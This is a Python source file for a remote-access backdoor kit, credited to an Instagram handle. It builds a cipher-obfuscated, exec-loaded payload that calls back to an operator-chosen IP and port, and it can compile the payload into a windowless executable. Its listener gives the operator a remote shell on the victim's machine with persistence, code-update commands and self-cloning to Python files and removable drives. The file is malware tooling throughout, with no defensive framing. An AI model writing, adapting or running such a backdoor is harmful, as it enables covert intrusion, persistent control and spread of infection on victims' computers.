import socket, time, os, platform

encrypted = list(
    """í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
decrypted = list(
    """ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")


def encrypt(string):
    final = ""
    for i in list(string):
        if i == "\n":
            final += "\n"
        else:
            n = decrypted.index(i)
            final += encrypted[n]
    return final


def decrypt(string):
    final = ""
    for i in list(string):
        if i == "\n":
            final += "\n"
        else:
            n = encrypted.index(i)
            final += decrypted[n]
    return final


global author_instagram
author_instagram = "tchewui"


class symbols():
    def __init__(self):
        self.defaults = "\033[39m"
        self.banners = "\033[36m"
        self.credits = "\033[34mmade by \033[31m@" + author_instagram + "\033[39m"
        self.sucesss = "\033[32m[+] "
        self.errors = "\033[31m[-] "
        self.warnings = "\033[33m[#] "
        self.infos = "\033[34m[!] "
        if (platform.system() != "Linux"):
            self.defaults = ""
            self.banners = ""
            self.credits = "made by @" + author_instagram
            self.sucesss = "[+] "
            self.errors = "[-] "
            self.warnings = "[#] "
            self.infos = "[!] "

    def default(self, text):
        return self.defaults + str(text) + self.defaults

    def banner(self, text):
        return self.banners + str(text) + self.defaults

    def credit(self):
        return self.credits + self.defaults

    def sucess(self, text):
        print(self.sucesss + str(text) + self.defaults)

    def error(self, text):
        print(self.errors + str(text) + self.defaults)

    def warning(self, text):
        print(self.warnings + str(text) + self.defaults)

    def info(self, text):
        print(self.infos + str(text) + self.defaults)


symbols = symbols()

print(symbols.default("###################################################################################\n" +
                      "###################################################################################\n" +
                      "##") + symbols.banner("||||||") + symbols.default("############") + symbols.banner(
    "|||||") + symbols.default("##########################################################\n" +
                               "##" + symbols.banner("||") + symbols.default("  ") + symbols.banner(
    "||") + symbols.default("############") + symbols.banner("||") + symbols.default("   ") + symbols.banner(
    "|") + symbols.default("###") + symbols.banner("|||||") + symbols.default("###########") + symbols.banner(
    "||") + symbols.default("#########") + symbols.banner("||") + symbols.default("#########################\n" +
                                                                                  "##") + symbols.banner(
    "||||||") + symbols.default("#") + symbols.banner("\\\\") + symbols.default("  ") + symbols.banner(
    "//") + symbols.default("#####") + symbols.banner("||||||") + symbols.default("####   ") + symbols.banner(
    "||") + symbols.default("##") + symbols.banner("||||||") + symbols.default("##") + symbols.banner(
    "||") + symbols.default(" ") + symbols.banner("//") + symbols.default("######") + symbols.banner(
    "||") + symbols.default("##") + symbols.banner("||||||") + symbols.default("##") + symbols.banner(
    "||||||") + symbols.default("##") + symbols.banner("||") + symbols.default(" ") + symbols.banner(
    "__") + symbols.default("##\n" +
                            "##") + symbols.banner("||") + symbols.default("######") + symbols.banner(
    "\\\\//") + symbols.default("######") + symbols.banner("||") + symbols.default("   ") + symbols.banner(
    "||") + symbols.default("##") + symbols.banner("||||||") + symbols.default("##") + symbols.banner(
    "||") + symbols.default("    ##") + symbols.banner("||//") + symbols.default(" ##") + symbols.banner(
    "||||||") + symbols.default("##") + symbols.banner("||") + symbols.default("  ") + symbols.banner(
    "||") + symbols.default("##") + symbols.banner("||") + symbols.default("  ") + symbols.banner(
    "||") + symbols.default("##") + symbols.banner("||//") + symbols.default("###\n" +
                                                                             "##") + symbols.banner(
    "||") + symbols.default("#######") + symbols.banner("//") + symbols.default("#######") + symbols.banner(
    "||") + symbols.default("    ") + symbols.banner("|") + symbols.default("##") + symbols.banner(
    "||") + symbols.default("  ") + symbols.banner("||") + symbols.default("##") + symbols.banner(
    "||") + symbols.default("    ##") + symbols.banner("||\\\\") + symbols.default(" ##") + symbols.banner(
    "||") + symbols.default("  ") + symbols.banner("||") + symbols.default("##") + symbols.banner(
    "||") + symbols.default("  ") + symbols.banner("||") + symbols.default("##") + symbols.banner(
    "||") + symbols.default("  ") + symbols.banner("||") + symbols.default("##") + symbols.banner(
    "||") + symbols.default("#####\n" +
                            "##") + symbols.banner("||") + symbols.default("######") + symbols.banner(
    "//") + symbols.default("########") + symbols.banner("|||||||") + symbols.default("##") + symbols.banner(
    "||||||") + symbols.default("##") + symbols.banner("||||||") + symbols.default("##") + symbols.banner(
    "||") + symbols.default(" ") + symbols.banner("\\\\") + symbols.default("##") + symbols.banner(
    "||||||") + symbols.default("##") + symbols.banner("||||||") + symbols.default("##") + symbols.banner(
    "||||||") + symbols.default("##") + symbols.banner("||") + symbols.default("#####\n" +
                                                                               "###################################################################################\n" +
                                                                               "###################################################################################\n\n")) +
      " " * (93 - len(symbols.credit())) + symbols.credit())


def create_backdoor():
    initial = '''encrypted = list("""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
decrypted = list("""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
def decrypt(string):
    final = ""
    for i in list(string):
        if i == "\\n":
            final += "\\n"
        else:
            n = encrypted.index(i)
            final += decrypted[n]
    return final
exec(decrypt({c133679455d4c91047b3b50234aa7ab}))'''
    print("Do you want to compile the backdoor? (Yes/No)")
    symbols.info("If you compile the backdoor, you can't change it's name")
    inp = input(">")
    to_compile = "True" if inp.lower() == "yes" else "False" if inp.lower() == "no" else create_backdoor()
    print("Name to the final file (without extension): ")
    symbols.warning("If you choosed to compile the file you can't change the name of the executable")
    final_name = str(input("> "))
    print("Server IP:")
    server = str(input("> "))
    print("Server Port")
    port = str(input("> "))
    symbols.info("Construction in progress")
    with open("backdoor_decrypted.py", encoding="utf-8") as file:
        decrypted_backdoor = file.read()
    encrypted_backdoor = encrypt(decrypted_backdoor.replace("{cb5185196ad3147d58c13c22b2a32292}", to_compile).replace(
        "{8f8c6b7b02405c7ab1027019e69a81e1}", final_name + ".exe" if bool(to_compile) else ".py").replace(
        "{cf1e8c14e54505f60aa10ceb8d5d8ab3}", server).replace("{901555fb06e346cb065ceb9808dcfc25}", port))
    symbols.info("Encrypted version of the backdoor created, making final file...")
    final_backdoor = initial.replace("{c133679455d4c91047b3b50234aa7ab}", encrypted_backdoor)
    with open(final_name + ".py", "w") as file:
        file.write(final_backdoor)
    symbols.info("Python file created")
    if bool(to_compile):
        symbols.info("Compiling file...")
        try:
            os.system("pyinstaller %s --onefile --noconsole" % (final_name + ".py"))
            symbols.info("Compiled file created")
            os.rmdir("build")
            os.system("copy dist/" + final_name + ".exe " + final_name + ".exe /b")
            os.rmdir("dist")
            os.remove(final_name + ".spec")
            os.remove(final_name + ".py")
            symbols.sucess("Backdoor sucessfully created: dist/" + final_name + ".exe")
            changeMenu()
        except:
            symbols.error("Error, please install pyinstaller or manually compile " + final_name + ".py")
            changeMenu()


def listen():
    try:
        listen_port = int(input(symbols.default("Listening port : "))) ## to 65535
        symbols.info("Listening on port " + str(listen_port))
        if (listen_port > 0 and listen_port < 65535):
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(("", listen_port))
            server.listen(1)
            conn, addr = server.accept()

            def send(string):
                conn.send(encrypt(string).encode("utf-8"))

            def recive(buffer):
                while True:
                    recived = conn.recv(buffer)
                    break
                return decrypt(recived.decode("utf-8"))

            def recive_buffer(buffer):
                bff = recive(buffer)
                if bff.startswith("#"):
                    buff = int(bff.split("#")[1]) * 2
                    condition_msg = True
                    while condition_msg:
                        msg = recive(buff)
                        condition_msg = False
                    return msg

            def send_buffer(string):
                buffer = len(str(string.encode("utf-8"))) + 10
                send("#{}".format(buffer))
                time.sleep(0.1)
                send(str(string))

            condition = True

            while condition:
                id_msg = recive_buffer(1024)
                condition = False
            symbols.info("Connection recived from {}:{}".format(str(addr[0]), str(addr[1])))
            if id_msg.startswith("231Py8ackd00r231"):
                symbols.sucess("Client verified successfully")
                symbols.info("Getting client status...")
                send_buffer("200")
                status = recive_buffer(1024)
                if status.startswith("200"):
                    symbols.sucess("Client status: OK")
                    # Start the terminal
                    symbols.info("Starting the terminal...")
                    condition = True
                    symbols.sucess("Terminal ready")
                    path = status.split(" ", 1)[1] + " >"
                    while condition:
                        command = input(path + " ")
                        ##### PERSISTENCE COMMAND #####
                        if command.startswith("persistence"):
                            if command.split(" ")[1] == "-s" or command.split(" ")[1] == "--status":
                                send_buffer("{persistence}-s")
                                symbols.info("Persistence status: " + recive_buffer(1024))
                            elif command.split(" ")[1] == "-r" or command.split(" ")[1] == "--retry":
                                send_buffer("{persistence}-r")
                                symbols.info("Persistence status: " + recive_buffer(1024))
                            else:
                                symbols.error(
                                    'Invalid argument, please use "help" to see how to use the commands correctly')
                        ##### CHDIR COMMAND #####
                        elif command.startswith("cd"):
                            dir = command.split(" ", 1)[1]
                            send_buffer("{chdir}" + dir)
                            response = recive_buffer(1024)
                            if response.startswith("{sucess}"):
                                dir = response.split("}", 1)[1]
                                path = dir + ">"
                            elif response.startswith("{error}"):
                                symbols.error(response.split("}")[1])
                        ##### EXIT COMMAND #####
                        elif command.startswith("exit"):
                            # Exit verification
                            symbols.warning(
                                "If you exit now without presistence you will loose the connection to the client forever")
                            exit = input(symbols.infos + 'Do you want to exit? (Yes/No): ' + symbols.defaults)
                            if exit == "Yes":
                                symbols.info("Closing connection...")
                                conn.close()
                                server.close()
                                time.sleep(1)
                                symbols.info("Connection closed")
                                symbols.info("Restarting listening...")
                                listen()
                                break
                            elif exit == "No":
                                pass
                            else:
                                symbols.error("Invalid option, aborting command")
                        # elif command.startswith("background"): ##FUTURE PROJECTS // MULTIPLE SESSIONS
                        ##### HELP COMMAND #####
                        elif command.startswith("help"):  ## HELP COMMAND
                            symbols.info("""Help

    - exit: Exit the connection and closes the backdoor on the victims computer, if precistence isn't active you will loose contact to it forever;

    - codeupdate: Updates the code of the backdoor on the victims computer:
        -p, --path: Path of the source code of the new version of the backdoor;

    - selfclone: Clone the code to other python files and removable drives on the computer:
        -p, -python: Clone just to python files on the computer,
        -rd, -removable_drives: Clone just to removable drives on the computer,
        -t, --target: Target directory to the search of python files(ex: C:\\Windows\\Users\\%user%\\Desktop\\Python_Files);

    - peesistence: Activate the persistence of the backdoor, if not activated when the backdoor was executed:
        -s, --status: Prints if persistence is enabled or disabled,
        -r, --retry: Retry to enable the persistence;

                            """)
                        elif command.startswith("codeupdate"):
                            file_path = command.split(" ", 1)[1]
                            with open(file_path, encoding="utf-8") as file_read:
                                file = file_read.read()
                            send_buffer("{codeupdate %s}" % (file_path.split("\\")[-1].split(".", 1)[1]) + file)
                        # elif command.startswith("selfclone"):
                        # elif command.startswith(""):
                        # elif command.startswith.(""):
                        ##### GENERAL COMMANDS #####
                        else:
                            send_buffer("{command}" + command)
                            while True:
                                response = recive_buffer(1024)
                                break
                            if response.startswith("{error}"):
                                symbols.error("Command doesn't exits or wasn't used the right way")
                            elif response.startswith("{sucess}"):
                                print(response.split("}", 1)[1])
                            pass
                            # error/cmd



                else:
                    symbols.error("Error getting client status")
            else:
                symbols.error("Failed to verify client")
                symbols.warning("Possible scan to your IP in progress")

    except KeyboardInterrupt:
        conn.close()
        server.close()
        changeMenu()##

def listen_multiple_sessions():
    print(symbols.info("in progress"))


def changeMenu():
    print("""        Menu 
1. Create Backdoor
2. Listen
3. Listen Multiple Sessions
""")
    menu = input()
    if (menu.isnumeric() and len(menu) == 1):
        current_menu = menu
    else:
        print(symbols.error("Invalid value, please try again:"))
        changeMenu()

    print(current_menu)

    if (current_menu == "1"):
        create_backdoor()
    elif (current_menu == "2"):
        listen()
    elif (current_menu == "3"):
        listen_multiple_sessions()
    else:
        print(symbols.error("Invalid option, please select a valid one:"))
        changeMenu()


changeMenu()
